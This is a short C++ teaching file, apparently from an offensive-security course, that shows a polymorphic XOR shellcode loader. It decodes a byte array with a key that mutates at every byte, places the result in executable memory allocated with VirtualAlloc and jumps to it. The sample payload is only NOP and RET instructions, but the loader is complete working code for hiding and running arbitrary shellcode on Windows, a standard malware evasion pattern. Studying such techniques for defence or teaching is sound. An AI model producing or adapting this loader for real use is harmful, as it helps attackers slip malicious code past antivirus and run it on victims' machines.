// Filename: xor_poly_shellcode.cpp
// Purpose: XOR decrypt with changing key (polymorphism).
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <vector>
#include <iostream>

void mutateXorDecrypt(std::vector<BYTE>& data, BYTE seed) {
    BYTE key = seed;
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key;
        key += 7; // key mutation
    }
}

int main() {
    BYTE encrypted[] = { 0x90 ^ 0x55, 0x90 ^ 0x5C, 0xC3 ^ 0x63 }; // Mutated XOR
    std::vector<BYTE> shellcode(encrypted, encrypted + sizeof(encrypted));
    
    mutateXorDecrypt(shellcode, 0x55);

    void* mem = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());
    ((void(*)())mem)();

    return 0;
}
